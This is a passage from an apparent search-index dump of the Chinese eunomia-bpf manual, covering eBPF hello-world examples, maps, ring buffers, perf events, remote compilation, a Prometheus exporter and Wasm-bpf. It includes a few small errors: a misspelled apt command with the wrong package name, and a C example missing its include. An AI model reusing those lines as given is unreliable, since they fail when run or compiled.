\u6846\u67b6\u7f16\u5199\u7684\u4ee3\u7801\u51e0\u4e4e\u4e0d\u9700\u8981\u6539\u52a8\u5373\u53ef\u79fb\u690d\uff1beunomia-bpf \u7f16\u5199\u7684 eBPF \u7a0b\u5e8f\u4e5f\u53ef\u4ee5\u4f7f\u7528 libbpf \u6846\u67b6\u6765\u76f4\u63a5\u7f16\u8bd1\u8fd0\u884c\uff1b</p> </li> <li> <p>\u672c\u5730\u53ea\u9700\u8981\u4e0b\u8f7d\u4e00\u4e2a\u5f88\u5c0f\u7684\u4e8c\u8fdb\u5236\u8fd0\u884c\u65f6\uff0c\u6ca1\u6709\u4efb\u4f55\u7684 Clang LLVM \u4e4b\u7c7b\u7684\u5927\u578b\u4f9d\u8d56\uff0c\u53ef\u4ee5\u652f\u6301\u70ed\u63d2\u62d4\u3001\u70ed\u66f4\u65b0\uff1b   \u4e5f\u53ef\u4ee5\u4f5c\u4e3a Lua \u865a\u62df\u673a\u90a3\u6837\u7684\u5c0f\u6a21\u5757\u76f4\u63a5\u7f16\u8bd1\u5d4c\u5165\u5176\u4ed6\u7684\u5927\u578b\u8f6f\u4ef6\u4e2d\uff0c\u63d0\u4f9b eBPF \u7a0b\u5e8f\u672c\u8eab\u7684\u670d\u52a1\uff1b\u8fd0\u884c\u548c\u542f\u52a8\u65f6\u8d44\u6e90\u5360\u7528\u7387\u90fd\u5f88\u4f4e\uff1b</p> </li> <li> <p>\u8ba9 eBPF \u7a0b\u5e8f\u7684\u5206\u53d1\u548c\u4f7f\u7528\u50cf\u7f51\u9875\u548c Web \u670d\u52a1\u4e00\u6837\u81ea\u7136\uff08Make eBPF as a service\uff09\uff1a   \u652f\u6301\u5728\u96c6\u7fa4\u73af\u5883\u4e2d\u76f4\u63a5\u901a\u8fc7\u4e00\u6b21\u8bf7\u6c42\u8fdb\u884c\u5206\u53d1\u548c\u70ed\u66f4\u65b0\uff0c\u4ec5\u9700\u6570\u5341 kB \u7684 payload\uff0c   &lt;100ms \u7684\u66f4\u65b0\u65f6\u95f4\uff0c\u548c\u5c11\u91cf\u7684 CPU \u5185\u5b58\u5360\u7528\u5373\u53ef\u5b8c\u6210 eBPF \u7a0b\u5e8f\u7684\u5206\u53d1\u3001\u90e8\u7f72\u548c\u66f4\u65b0\uff1b   \u4e0d\u9700\u8981\u6267\u884c\u989d\u5916\u7684\u7f16\u8bd1\u8fc7\u7a0b\uff0c\u5c31\u80fd\u5f97\u5230 CO-RE \u7684\u8fd0\u884c\u6548\u7387\uff1b</p> </li> </ul>"},{"location":"eunomia-bpf/manual/#c-hello-world","title":"\u4ece C \u8bed\u8a00 \u7684 Hello World \u5f00\u59cb","text":"<p>\u8fd8\u8bb0\u5f97\u60a8\u7b2c\u4e00\u6b21\u5199 C \u8bed\u8a00 \u7684 Hello World \u7a0b\u5e8f \u5417\uff1f\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a <code>.c</code> \u6587\u4ef6\uff0c\u5b83\u5305\u542b\u4e00\u4e2a <code>main</code> \u51fd\u6570\uff1a</p> <pre><code>int main(void)\n{\n    printf(\"Hello, World!\\n\");\n    return 0;\n}\n</code></pre> <p>\u6211\u4eec\u53eb\u5b83 <code>hello.c</code>\uff0c\u63a5\u4e0b\u6765\u5c31\u53ea\u9700\u8981\u8fd9\u51e0\u4e2a\u6b65\u9aa4\u5c31\u597d\uff1a</p> <pre><code># if you are using Ubuntu without a c compiler\nsudo apt insalll build-essentials\n# compile the program\ngcc -o hello hello.c\n# run the program\n./hello\n</code></pre> <p>\u53ea\u9700\u8981\u5199\u4e00\u4e2a c \u6587\u4ef6\uff0c\u6267\u884c\u4e24\u884c\u547d\u4ee4\u5c31\u53ef\u4ee5\u8fd0\u884c\uff1b\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u4f60\u4e5f\u53ef\u4ee5\u628a\u7f16\u8bd1\u597d\u7684\u53ef\u6267\u884c\u6587\u4ef6\u76f4\u63a5\u79fb\u52a8\u5230\u5176\u4ed6\u540c\u6837\u67b6\u6784\u7684\u673a\u5668\u6216\u4e0d\u540c\u7248\u672c\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0a\uff0c\u7136\u540e\u8fd0\u884c\u5b83\uff0c\u4e5f\u4f1a\u5f97\u5230\u4e00\u6837\u7684\u7ed3\u679c:</p> <pre><code>Hello World!\n</code></pre>"},{"location":"eunomia-bpf/manual/#eunomia-bpf-hello-world","title":"eunomia-bpf \u7684 Hello World","text":"<p>\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a <code>bpf.c</code> \u6587\u4ef6\uff0c\u5b83\u5c31\u662f\u6b63\u5e38\u7684\u3001\u5408\u6cd5\u7684 C \u8bed\u8a00\u4ee3\u7801\uff0c\u548c libbpf \u6240\u4f7f\u7528\u7684\u5b8c\u5168\u76f8\u540c\uff1a</p> <pre><code>#include &lt;linux/bpf.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\ntypedef int pid_t;\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nSEC(\"tp/syscalls/sys_enter_write\")\nint handle_tp(void *ctx)\n{\n pid_t pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n bpf_printk(\"BPF triggered from PID %d.\\n\", pid);\n return 0;\n}\n</code></pre> <p>\u5047\u8bbe\u5b83\u53eb <code>hello.bpf.c</code>\uff0c\u65b0\u5efa\u4e00\u4e2a <code>/path/to/repo</code> \u7684\u6587\u4ef6\u5939\u5e76\u4e14\u628a\u5b83\u653e\u8fdb\u53bb\uff0c\u63a5\u4e0b\u6765\u7684\u6b65\u9aa4\uff1a</p> <pre><code># \u4e0b\u8f7d\u5b89\u88c5 ecli \u4e8c\u8fdb\u5236\nwget https://aka.pw/bpf-ecli -O /usr/local/ecli &amp;&amp; chmod +x /usr/local/ecli\n# \u4f7f\u7528\u5bb9\u5668\u8fdb\u884c\u7f16\u8bd1\uff0c\u751f\u6210\u4e00\u4e2a package.json \u6587\u4ef6\uff0c\u91cc\u9762\u662f\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684\u4ee3\u7801\u548c\u4e00\u4e9b\u8f85\u52a9\u4fe1\u606f\ndocker run -it -v /path/to/repo:/src ghcr.io/eunomia-bpf/ecc-`uname -m`:latest\n# \u8fd0\u884c eBPF \u7a0b\u5e8f\uff08root shell\uff09\nsudo ecli run package.json\n</code></pre> <p>\u4f7f\u7528 docker \u7684\u65f6\u5019\u9700\u8981\u628a\u5305\u542b .bpf.c \u6587\u4ef6\u7684\u76ee\u5f55\u6302\u8f7d\u5230\u5bb9\u5668\u7684 /src \u76ee\u5f55\u4e0b\uff0c\u76ee\u5f55\u4e2d\u53ea\u6709\u4e00\u4e2a .bpf.c \u6587\u4ef6\uff1b</p> <p>\u5b83\u4f1a\u8ffd\u8e2a\u6240\u6709\u8fdb\u884c write \u7cfb\u7edf\u8c03\u7528\u7684\u8fdb\u7a0b\u7684 pid\uff1a</p> <pre><code>$ sudo cat /sys/kernel/debug/tracing/trace_pipe\ncat-42755   [003] d...1 48755.529860: bpf_trace_printk: BPF triggered from PID 42755.\n             cat-42755   [003] d...1 48755.529874: bpf_trace_printk: BPF triggered from PID 42755.\n</code></pre> <p>\u6211\u4eec\u7f16\u8bd1\u597d\u7684 eBPF \u4ee3\u7801\u540c\u6837\u53ef\u4ee5\u9002\u914d\u591a\u79cd\u5185\u6838\u7248\u672c\uff0c\u53ef\u4ee5\u76f4\u63a5\u628a package.json \u590d\u5236\u5230\u53e6\u5916\u4e00\u4e2a\u673a\u5668\u4e0a\uff0c\u7136\u540e\u4e0d\u9700\u8981\u91cd\u65b0\u7f16\u8bd1\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fd0\u884c\uff08CO-RE\uff1aCompile Once Run Every Where\uff09\uff1b\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u4f20\u8f93\u548c\u5206\u53d1 package.json\uff0c\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u538b\u7f29\u540e\u7684\u7248\u672c\u53ea\u6709\u51e0 kb \u5230\u51e0\u5341 kb\u3002</p>"},{"location":"eunomia-bpf/manual/#map","title":"\u6dfb\u52a0 map \u8bb0\u5f55\u6570\u636e","text":"<p>\u53c2\u8003\uff1ahttps://github.com/eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools/bootstrap</p> <pre><code>struct {\n __uint(type, BPF_MAP_TYPE_HASH);\n __uint(max_entries, 8192);\n __type(key, pid_t);\n __type(value, u64);\n} exec_start SEC(\".maps\");\n</code></pre> <p>\u6dfb\u52a0 map \u7684\u529f\u80fd\u548c libbpf \u6ca1\u6709\u4efb\u4f55\u533a\u522b\uff0c\u53ea\u9700\u8981\u5728 .bpf.c \u4e2d\u5b9a\u4e49\u5373\u53ef\u3002</p>"},{"location":"eunomia-bpf/manual/#ring-buffer","title":"\u4f7f\u7528 ring buffer \u5f80\u7528\u6237\u6001\u53d1\u9001\u6570\u636e","text":"<p>\u53c2\u8003\uff1ahttps://github.com/eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools/bootstrap</p> <p>\u53ea\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u5934\u6587\u4ef6\uff0c\u5305\u542b\u4f60\u60f3\u8981\u53d1\u9001\u7ed9\u7528\u6237\u6001\u7684\u6570\u636e\u683c\u5f0f\uff0c\u4ee5 <code>.h</code> \u4f5c\u4e3a\u540e\u7f00\u540d\uff1a</p> <pre><code>/* SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause) */\n/* Copyright (c) 2020 Facebook */\n#ifndef __BOOTSTRAP_H\n#define __BOOTSTRAP_H\n\n#define TASK_COMM_LEN 16\n#define MAX_FILENAME_LEN 127\n\nstruct event {\n int pid;\n int ppid;\n unsigned exit_code;\n unsigned long long duration_ns;\n char comm[TASK_COMM_LEN];\n char filename[MAX_FILENAME_LEN];\n unsigned char exit_event;\n};\n\n#endif /* __BOOTSTRAP_H */\n</code></pre> <p>\u5728\u4ee3\u7801\u4e2d\u5b9a\u4e49\u73af\u5f62\u7f13\u51b2\u533a\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5b83\uff1a</p> <pre><code>struct {\n __uint(type, BPF_MAP_TYPE_RINGBUF);\n __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n\nSEC(\"tp/sched/sched_process_exec\")\nint handle_exec(struct trace_event_raw_sched_process_exec *ctx)\n{\n    ......\n e-&gt;exit_event = false;\n e-&gt;pid = pid;\n e-&gt;ppid = BPF_CORE_READ(task, real_parent, tgid);\n bpf_get_current_comm(&amp;e-&gt;comm, sizeof(e-&gt;comm));\n /* successfully submit it to user-space for post-processing */\n bpf_ringbuf_submit(e, 0);\n return 0;\n}\n</code></pre> <p>eunomia-bpf \u4f1a\u81ea\u52a8\u53bb\u6e90\u4ee3\u7801\u4e2d\u627e\u5230\u5bf9\u5e94\u7684 ring buffer map\uff0c\u5e76\u4e14\u628a ring buffer \u548c\u7c7b\u578b\u4fe1\u606f\u8bb0\u5f55\u5728\u7f16\u8bd1\u597d\u7684\u4fe1\u606f\u4e2d\uff0c\u5e76\u5728\u8fd0\u884c\u7684\u65f6\u5019\u81ea\u52a8\u5b8c\u6210\u5bf9\u4e8e ring buffer \u7684\u52a0\u8f7d\u3001\u5bfc\u51fa\u4e8b\u4ef6\u7b49\u5de5\u4f5c\u3002\u6240\u6709\u7684 eBPF \u4ee3\u7801\u548c\u539f\u751f\u7684 libbpf \u7a0b\u5e8f\u6ca1\u6709\u4efb\u4f55\u533a\u522b\uff0c\u4f7f\u7528 eunomia-bpf \u5f00\u53d1\u7684\u4ee3\u7801\u4e5f\u53ef\u4ee5\u5728 libbpf \u4e2d\u65e0\u9700\u4efb\u4f55\u6539\u52a8\u5373\u53ef\u7f16\u8bd1\u8fd0\u884c\u3002</p>"},{"location":"eunomia-bpf/manual/#perf-event-array","title":"\u4f7f\u7528 perf event array \u5f80\u7528\u6237\u6001\u53d1\u9001\u6570\u636e","text":"<p>\u4f7f\u7528 perf event \u7684\u539f\u7406\u548c\u4f7f\u7528 ring buffer \u975e\u5e38\u7c7b\u4f3c\uff0c\u4f7f\u7528\u6211\u4eec\u7684\u6846\u67b6\u65f6\uff0c\u4e5f\u53ea\u9700\u8981\u5728\u5934\u6587\u4ef6\u4e2d\u5b9a\u4e49\u597d\u6240\u9700\u5bfc\u51fa\u7684\u4e8b\u4ef6\uff0c\u7136\u540e\u5b9a\u4e49\u4e00\u4e0b perf event map\uff1a</p> <pre><code>struct {\n __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);\n __uint(key_size, sizeof(u32));\n __uint(value_size, sizeof(u32));\n} events SEC(\".maps\");\n</code></pre> <p>\u53ef\u4ee5\u53c2\u8003\uff1ahttps://github.com/eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools/opensnoop \u5b83\u662f\u76f4\u63a5\u4ece libbpf-tools \u4e2d\u79fb\u690d\u7684\u5b9e\u73b0\uff1b</p>"},{"location":"eunomia-bpf/manual/#github-template","title":"\u4f7f\u7528 github-template \u5b9e\u73b0\u8fdc\u7a0b\u7f16\u8bd1","text":"<p>\u7531\u4e8e eunomia-bpf \u7684\u7f16\u8bd1\u548c\u8fd0\u884c\u9636\u6bb5\u5b8c\u5168\u5206\u79bb\uff0c\u53ef\u4ee5\u5b9e\u73b0\u5728 github \u7f51\u9875\u4e0a\u7f16\u8f91\u4e4b\u540e\uff0c\u901a\u8fc7 github actions \u6765\u5b8c\u6210\u7f16\u8bd1\uff0c\u4e4b\u540e\u5728\u672c\u5730\u4e00\u884c\u547d\u4ee4\u5373\u53ef\u542f\u52a8\uff1a</p> <ol> <li>\u5c06\u6b64 github.com/eunomia-bpf/ebpm-template \u7528\u4f5c github \u6a21\u677f\uff1a\u8bf7\u53c2\u9605 creating-a-repository-from-a-template</li> <li>\u4fee\u6539 bootstrap.bpf.c\uff0c commit \u5e76\u7b49\u5f85\u5de5\u4f5c\u6d41\u505c\u6b62</li> <li>\u6211\u4eec\u914d\u7f6e\u4e86 github pages \u6765\u5b8c\u6210\u7f16\u8bd1\u597d\u7684 json \u7684\u5bfc\u51fa\uff0c\u4e4b\u540e\u5c31\u53ef\u4ee5\u5b9e\u73b0 ecli \u4f7f\u7528\u8fdc\u7a0b url \u4e00\u884c\u547d\u4ee4\u5373\u53ef\u8fd0\u884c\uff1a</li> </ol> <pre><code>sudo ./ecli run https://eunomia-bpf.github.io/ebpm-template/package.json\n</code></pre>"},{"location":"eunomia-bpf/manual/#api","title":"\u901a\u8fc7 API \u8fdb\u884c\u70ed\u63d2\u62d4\u548c\u5206\u53d1","text":"<p>\u7531\u4e8e eunomia-cc \u7f16\u8bd1\u51fa\u6765\u7684 ebpf \u7a0b\u5e8f\u4ee3\u7801\u548c\u9644\u52a0\u4fe1\u606f\u5f88\u5c0f\uff08\u7ea6\u6570\u5341 kb\uff09\uff0c\u4e14\u4e0d\u9700\u8981\u540c\u65f6\u4f20\u9012\u4efb\u4f55\u7684\u989d\u5916\u4f9d\u8d56\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u5730\u901a\u8fc7\u7f51\u7edc API \u76f4\u63a5\u8fdb\u884c\u5206\u53d1\uff0c\u4e5f\u53ef\u4ee5\u5728\u5f88\u77ed\u7684\u65f6\u95f4\uff08\u5927\u7ea6 100ms\uff09\u5185\u5b9e\u73b0\u70ed\u63d2\u62d4\u548c\u70ed\u66f4\u65b0\u3002\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7b80\u5355\u7684 client \u548c server\uff0c\u8bf7\u53c2\u8003;</p> <p>ecli-server.md</p> <p>\u4e4b\u524d\u4e5f\u6709\u4e00\u7bc7\u6bd4\u8d5b\u9879\u76ee\u7684\u53ef\u884c\u6027\u9a8c\u8bc1\u7684\u6587\u7ae0\uff1a</p> <p>https://zhuanlan.zhihu.com/p/555362934</p>"},{"location":"eunomia-bpf/manual/#prometheus-opentelemetry","title":"\u4f7f\u7528 Prometheus \u6216 OpenTelemetry \u8fdb\u884c\u53ef\u89c2\u6d4b\u6027\u6570\u636e\u6536\u96c6","text":"<p>\u57fa\u4e8e async Rust \u7684 Prometheus \u6216 OpenTelemetry \u81ea\u5b9a\u4e49\u53ef\u89c2\u6d4b\u6027\u6570\u636e\u6536\u96c6\u5668: eunomia-exporter</p> <p>\u53ef\u4ee5\u81ea\u884c\u7f16\u8bd1\u6216\u901a\u8fc7 release \u4e0b\u8f7d</p>"},{"location":"eunomia-bpf/manual/#example","title":"example","text":"<p>\u8fd9\u662f\u4e00\u4e2a <code>opensnoop</code> \u7a0b\u5e8f\uff0c\u8ffd\u8e2a\u6240\u6709\u7684\u6253\u5f00\u6587\u4ef6\uff0c\u6e90\u4ee3\u7801\u6765\u81ea bcc/libbpf-tools, \u6211\u4eec\u4fee\u6539\u8fc7\u540e\u7684\u6e90\u4ee3\u7801\u5728\u8fd9\u91cc: examples/bpftools/opensnoop</p> <p>\u5728\u7f16\u8bd1\u4e4b\u540e\uff0c\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a\u8fd9\u6837\u7684\u914d\u7f6e\u6587\u4ef6:</p> <pre><code>programs:\n  - name: opensnoop\n    metrics:\n      counters:\n        - name: eunomia_file_open_counter\n          description: test\n          labels:\n            - name: pid\n            - name: comm\n            - name: filename\n              from: fname\n    compiled_ebpf_filename: examples/bpftools/opensnoop/package.json\n</code></pre> <p>\u7136\u540e\uff0c\u60a8\u53ef\u4ee5\u5728\u4efb\u4f55\u5730\u65b9\u4f7f\u7528 <code>config.yaml</code> \u548c\u9884\u7f16\u8bd1\u7684 eBPF \u6570\u636e <code>package.json</code> \u542f\u52a8 Prometheus \u5bfc\u51fa\u5668\uff0c\u60a8\u53ef\u4ee5\u770b\u5230\u5982\u4e0b\u6307\u6807\uff1a</p> <p></p> <p>\u60a8\u53ef\u4ee5\u5728\u4efb\u4f55\u5185\u6838\u7248\u672c\u4e0a\u90e8\u7f72\u5bfc\u51fa\u5668\uff0c\u800c\u65e0\u9700\u4f9d\u8d56 <code>LLVM/Clang</code>\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 eunomia-exporter\u3002</p>"},{"location":"eunomia-bpf/manual/#wasm-ebpf","title":"\u4f7f\u7528 Wasm \u6a21\u5757\u5206\u53d1\u3001\u52a8\u6001\u52a0\u8f7d eBPF \u7a0b\u5e8f","text":"<p>\u501f\u52a9 Wasm-bpf \u7f16\u8bd1\u5de5\u5177\u94fe\u548c\u8fd0\u884c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Wasm \u5c06 eBPF \u7a0b\u5e8f\u7f16\u5199\u4e3a\u8de8\u5e73\u53f0\u7684\u6a21\u5757\uff0c\u540c\u65f6\u4f7f\u7528 C/C++ \u6216 Rust \u6765\u7f16\u5199 Wasm \u7a0b\u5e8f\u3002\u901a\u8fc7\u5728 WebAssembly \u4e2d\u4f7f\u7528 eBPF \u7a0b\u5e8f\uff0c\u6211\u4eec\u4e0d\u4ec5\u80fd\u8ba9 Wasm \u5e94\u7528\u4eab\u53d7\u5230 eBPF \u7684\u9ad8\u6027\u80fd\u548c\u5bf9\u7cfb\u7edf\u63a5\u53e3\u7684\u8bbf\u95ee\u80fd\u529b\uff0c\u8fd8\u53ef\u4ee5\u8ba9 eBPF \u7a0b\u5e8f\u4f7f\u7528\u5230 Wasm \u7684\u6c99\u7bb1\u3001\u7075\u6d3b\u6027\u3001\u8de8\u5e73\u53f0\u6027\u3001\u548c\u52a8\u6001\u52a0\u8f7d\uff0c\u5e76\u4e14\u4f7f\u7528 Wasm \u7684 OCI \u955c\u50cf\u6765\u65b9\u4fbf\u3001\u5feb\u6377\u5730\u5206\u53d1\u548c\u7ba1\u7406 eBPF \u7a0b\u5e8f\u3002\u7ed3\u5408\u8fd9\u4e24\u79cd\u6280\u672f\uff0c\u6211\u4eec\u5c06\u4f1a\u7ed9 eBPF \u548c Wasm \u751f\u6001\u6765\u4e00\u4e2a\u5168\u65b0\u7684\u5f00\u53d1\u4f53\u9a8c\uff01</p> <p>Wasm-bpf \u662f\u4e00\u4e2a\u65b0\u7684\u5f00\u6e90\u9879\u76ee\uff1ahttps://github.com/eunomia-bpf/wasm-bpf\u3002\u5b83\u5b9a\u4e49\u4e86\u4e00\u5957 eBPF \u76f8\u5173\u7cfb\u7edf\u63a5\u53e3\u7684\u62bd\u8c61\uff0c\u5e76\u63d0\u4f9b\u4e86\u4e00\u5957\u5bf9\u5e94\u7684\u5f00\u53d1\u5de5\u5177\u94fe\u3001\u5e93\u4ee5\u53ca\u901a\u7528\u7684 Wasm + eBPF \u8fd0\u884c\u65f6\u5b9e\u4f8b\u3002\u5b83\u53ef\u4ee5\u63d0\u4f9b\u548c libbpf-bootstrap \u76f8\u4f3c\u7684\u5f00\u53d1\u4f53\u9a8c\uff0c\u81ea\u52a8\u751f\u6210\u5bf9\u5e94\u7684 skeleton \u5934\u6587\u4ef6\uff0c\u4ee5\u53ca\u7528\u4e8e\u5728 Wasm \u548c eBPF \u4e4b\u95f4\u65e0\u5e8f\u5217\u5316\u901a\u4fe1\u7684\u6570\u636e\u7ed3\u6784\u5b9a\u4e49\u3002\u4f60\u53ef\u4ee5\u975e\u5e38\u5bb9\u6613\u5730\u4f7f\u7528\u4efb\u4f55\u8bed\u8a00\uff0c\u5728\u4efb\u4f55\u5e73\u53f0\u4e0a\u5efa\u7acb\u4f60\u81ea\u5df1\u7684 Wasm-eBPF \u8fd0\u884c\u65f6\uff0c\u4f7f\u7528\u76f8\u540c\u7684\u5de5\u5177\u94fe\u6765\u6784\u5efa\u5e94\u7528\u3002\u66f4\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u53c2\u8003\u6211\u4eec\u7684\u4e0a\u4e00\u7bc7\u535a\u5ba2\uff1aWasm-bpf: \u67b6\u8d77 Webassembly \u548c eBPF \u5185\u6838\u53ef\u7f16\u7a0b\u7684\u6865\u6881\u3002</p> <p>\u57fa\u4e8e Wasm\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u8bed\u8a00\u6784\u5efa eBPF \u5e94\u7528\uff0c\u5e76\u4ee5\u7edf\u4e00\u3001\u8f7b\u91cf\u7ea7\u7684\u65b9\u5f0f\u7ba1\u7406\u548c\u53d1\u5e03\u3002\u4ee5\u6211\u4eec\u6784\u5efa\u7684\u793a\u4f8b\u5e94\u7528 bootstrap.wasm \u4e3a\u4f8b\uff0c\u5927\u5c0f\u4ec5\u4e3a ~90K\uff0c\u5f88\u5bb9\u6613\u901a\u8fc7\u7f51\u7edc\u5206\u53d1\uff0c\u5e76\u53ef\u4ee5\u5728\u4e0d\u5230 100ms \u7684\u65f6\u95f4\u5185\u5728\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u52a8\u6001\u90e8\u7f72\u3001\u52a0\u8f7d\u548c\u8fd0\u884c\uff0c\u5e76\u4e14\u4fdd\u7559\u8f7b\u91cf\u7ea7\u5bb9\u5668\u7684\u9694\u79bb\u7279\u6027\u3002\u8fd0\u884c\u65f6\u4e0d\u9700\u8981\u5185\u6838\u5934\u6587\u4ef6\u3001LLVM\u3001clang \u7b49\u4f9d\u8d56\uff0c\u4e5f\u4e0d\u9700\u8981\u505a\u4efb\u4f55\u6d88\u8017\u8d44\u6e90\u7684\u91cd\u91cf\u7ea7\u7684\u7f16\u8bd1\u5de5\u4f5c\u3002</p> <p>\u672c\u6587\u5c06\u4ee5 C/C++ \u8bed\u8a00\u4e3a\u4f8b\uff0c\u8ba8\u8bba C/C++ \u7f16\u5199 eBPF \u7a0b\u5e8f\u5e76\u7f16\u8bd1\u4e3a Wasm \u6a21\u5757\u3002\u4f7f\u7528 Rust \u8bed\u8a00\u7f16\u5199 eBPF \u7a0b\u5e8f\u5e76\u7f16\u8bd1\u4e3a Wasm \u6a21\u5757\u7684\u5177\u4f53\u793a\u4f8b\uff0c\u5c06\u5728\u4e0b\u4e00\u7bc7\u6587\u7ae0\u4e2d\u63cf\u8ff0\u3002</p> <p>\u6211\u4eec\u5728\u4ed3\u5e93\u4e2d\u63d0\u4f9b\u4e86\u51e0\u4e2a\u793a\u4f8b\u7a0b\u5e8f\uff0c\u5206\u522b\u5bf9\u5e94\u4e8e\u53ef\u89c2\u6d4b\u3001\u7f51\u7edc\u3001\u5b89\u5168\u7b49\u591a\u79cd\u573a\u666f\u3002</p>"},{"location":"eunomia-bpf/manual/#wasm-ebpf_1","title":"\u4f7f\u7528 Wasm \u5f00\u53d1\u548c\u6253\u5305 eBPF \u7a0b\u5e8f","text":"<p>libbpf \u662f\u4e00\u4e2a C/C++ \u7684 eBPF \u7528\u6237\u6001\u52a0\u8f7d\u548c\u63a7\u5236\u5e93\uff0c\u968f\u7740\u5185\u6838\u4e00\u8d77\u5206\u53d1\uff0c\u51e0\u4e4e\u5df2\u7ecf\u6210\u4e3a eBPF \u7528\u6237\u6001\u4e8b\u5b9e\u4e0a\u7684 API \u6807\u51c6\uff0clibbpf \u4e5f\u652f\u6301 CO-RE(Compile Once \u2013 Run Everywhere) \u7684\u89e3\u51b3\u65b9\u6848\uff0c\u5373\u9884\u7f16\u8bd1\u7684 bpf \u4ee3\u7801\u53ef\u4ee5\u5728\u4e0d\u540c\u5185\u6838\u7248\u672c\u4e0a\u6b63\u5e38\u5de5\u4f5c\uff0c\u800c\u65e0\u9700\u4e3a\u6bcf\u4e2a\u7279\u5b9a\u5185\u6838\u91cd\u65b0\u7f16\u8bd1\u3002\u6211\u4eec\u5e0c\u671b\u5c3d\u53ef\u80fd\u7684\u4fdd\u6301\u4e0e libbpf \u7684\u7528\u6237\u6001 API \u4ee5\u53ca\u884c\u4e3a\u4e00\u81f4\uff0c\u5c3d\u53ef\u80fd\u51cf\u5c11\u5e94\u7528\u8fc1\u79fb\u5230 Wasm \uff08\u5982\u679c\u9700\u8981\u7684\u8bdd\uff09\u7684\u6210\u672c\u3002</p> <p>libbpf-bootstrap \u4e3a\u751f\u6210\u57fa\u4e8e libbpf \u7684 bpf \u7a0b\u5e8f\u63d0\u4f9b\u4e86\u6a21\u677f,\u5f00\u53d1\u8005\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u4f7f\u7528\u8be5\u6a21\u677f\u751f\u6210\u81ea\u5b9a\u4e49\u7684 bpf \u7a0b\u5e8f\u3002\u4e00\u822c\u8bf4\u6765\uff0c\u5728\u975e Wasm \u6c99\u7bb1\u7684\u7528\u6237\u6001\u7a7a\u95f4\uff0c\u4f7f\u7528 libbpf-bootstrap \u811a\u624b\u67b6\uff0c\u53ef\u4ee5\u5feb\u901f\u3001\u8f7b\u677e\u5730\u4f7f\u7528 C/C++\u6784\u5efa BPF \u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u7f16\u8bd1\u3001\u6784\u5efa\u548c\u8fd0\u884c eBPF \u7a0b\u5e8f\uff08\u65e0\u8bba\u662f\u91c7\u7528\u4ec0\u4e48\u8bed\u8a00\uff09\uff0c\u901a\u5e38\u5305\u542b\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\uff1a</p> <ul> <li>\u7f16\u5199\u5185\u6838\u6001 eBPF \u7a0b\u5e8f\u7684\u4ee3\u7801\uff0c\u4e00\u822c\u4f7f\u7528 C/C++ \u6216 Rust \u8bed\u8a00</li> <li>\u4f7f\u7528 clang \u7f16\u8bd1\u5668\u6216\u8005\u76f8\u5173\u5de5\u5177\u94fe\u7f16\u8bd1 eBPF \u7a0b\u5e8f\uff08\u8981\u5b9e\u73b0\u8de8\u5185\u6838\u7248\u672c\u79fb\u690d\u7684\u8bdd\uff0c\u9700\u8981\u5305\u542b BTF \u4fe1\u606f\uff09\u3002</li> <li>\u5728\u7528\u6237\u6001\u7684\u5f00\u53d1\u7a0b\u5e8f\u4e2d\uff0c\u7f16\u5199\u5bf9\u5e94\u7684\u52a0\u8f7d\u3001\u63a7\u5236\u3001\u6302\u8f7d\u3001\u6570\u636e\u5904\u7406\u903b\u8f91\uff1b</li> <li>\u5728\u5b9e\u9645\u8fd0\u884c\u7684\u9636\u6bb5\uff0c\u4ece\u7528\u6237\u6001\u5c06 eBPF \u7a0b\u5e8f\u52a0\u8f7d\u8fdb\u5165\u5185\u6838\uff0c\u5e76\u5b9e\u9645\u6267\u884c\u3002</li> </ul>"},{"location":"eunomia-bpf/manual/#bootstrap","title":"bootstrap","text":"<p><code>bootstrap</code>\u662f\u4e00\u4e2a\u7b80\u5355\uff08\u4f46\u5b9e\u7528\uff09\u7684BPF\u5e94\u7528\u7a0b\u5e8f\u7684\u4f8b\u5b50\u3002\u5b83\u8ddf\u8e2a\u8fdb\u7a0b\u7684\u542f\u52a8\uff08\u51c6\u786e\u5730\u8bf4\uff0c\u662f <code>exec()</code> \u7cfb\u5217\u7684\u7cfb\u7edf\u8c03\u7528\uff09\u548c\u9000\u51fa\uff0c\u5e76\u53d1\u9001\u5173\u4e8e\u6587\u4ef6\u540d\u3001PID \u548c \u7236 PID \u7684\u6570\u636e\uff0c\u4ee5\u53ca\u9000\u51fa\u72b6\u6001\u548c\u8fdb\u7a0b\u7684\u6301\u7eed\u65f6\u95f4\u3002\u7528<code>-d &lt;min-duration-ms&gt;</code> 